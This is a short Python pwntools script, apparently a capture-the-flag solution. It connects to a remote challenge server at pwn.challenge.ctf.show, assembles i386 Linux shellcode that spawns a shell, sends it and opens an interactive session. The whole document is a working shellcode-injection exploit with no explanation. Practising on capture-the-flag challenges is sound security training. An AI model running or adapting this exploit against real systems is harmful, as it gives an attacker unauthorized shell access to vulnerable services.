from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28188)
shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
